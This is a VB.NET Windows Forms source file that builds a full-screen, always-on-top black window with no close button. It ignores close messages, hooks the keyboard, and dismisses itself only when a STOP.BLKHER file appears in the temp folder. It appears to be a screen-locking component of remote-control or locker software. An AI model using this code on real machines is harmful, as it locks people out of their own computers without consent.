Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class Form1

    Inherits System.Windows.Forms.Form

    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub


    Private components As System.ComponentModel.IContainer

    <System.Diagnostics.DebuggerStepThrough()>
    Public Sub InitializeComponent()
        Me.SuspendLayout()
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(800, 450)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "Form1"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "Form1"
        Me.ResumeLayout(False)

    End Sub

    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            IO.File.Delete(IO.Path.GetTempPath + "/STOP.BLKHER")
        Catch ex As Exception

        End Try

        Dim k As Integer = Me.Handle
        Me.WindowState = Windows.Forms.FormWindowState.Maximized
        NativeHelper.SetWindowPos(k, NativeHelper.HWND_TOPMOST, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, NativeHelper.SWP_NOMOVE Or NativeHelper.SWP_NOSIZE Or NativeHelper.SWP_NOREDRAW Or NativeHelper.SWP_DEFERERASE)
        Aero.SetAero10(k)

        Dim o As New KeyBoardHooking
        o.HookKeyboard()

        Task.Run(Sub() Checker())

    End Sub

    Protected Overrides Sub WndProc(ByRef m As Message)

        If (m.Msg) = &H2 Then 'destroy

            MyBase.WndProc(m)

        ElseIf m.Msg = &H10 Then


        ElseIf m.Msg = &HF Then

        Else
            MyBase.WndProc(m)
        End If

    End Sub
    Private Sub Checker()
        While True
            If IO.File.Exists(IO.Path.GetTempPath + "/STOP.BLKHER") Then

                Try
                    SendMessage(Me.FindForm.Handle, &H2, &H0, 0)

                Catch ex As Exception

                End Try

                Try

                    SendMessage(Me.FindForm.Handle, &H10, 0, 0)

                Catch ex As Exception

                End Try
                Try

                    PostMessage(Me.FindForm.Handle, &H10, 0, 0)

                Catch ex As Exception

                End Try
                Try

                    PostMessage(Me.FindForm.Handle, &H2, &H0, 0)

                Catch ex As Exception

                End Try

                IO.File.Delete(IO.Path.GetTempPath + "/STOP.BLKHER")

                Exit While

            End If
            Threading.Thread.Sleep(500)
        End While

        Exit Sub
    End Sub


    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Public Shared Function PostMessage(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function


End Class
